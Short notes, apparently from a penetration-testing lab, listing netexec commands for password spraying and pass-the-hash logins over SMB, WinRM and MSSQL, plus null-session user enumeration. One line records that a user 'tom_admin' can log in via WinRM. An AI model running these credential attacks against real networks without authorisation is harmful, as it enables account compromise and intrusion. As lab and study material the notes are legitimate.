
```
netexec smb TARGET/24 -u users -p pass --continue-on-success
```

```
netexec smb TARGET -u "" -p "" --users
```

```
netexec winrm TARGET/24 -u user -p pass --continue-on-success
```

```
netexec winrm TARGET/24 -u users -H hashes --continue-on-success
```

```
netexec winrm MS02 -u user -p pass --continue-on-success --local-auth
```

```
netexec smb MS02 -u user -p password --continue-on-success --local-auth
```

```
netexec tells me that tom_admin can login via winrm
```

```
netexec mssql TARGET/24 -u users -p pass --continue-on-success
```

```
netexec winrm TARGET -u users.txt -H hashes.txt
```

```
netexec winrm TARGET -u users.txt -p pass --continue-on-success
```

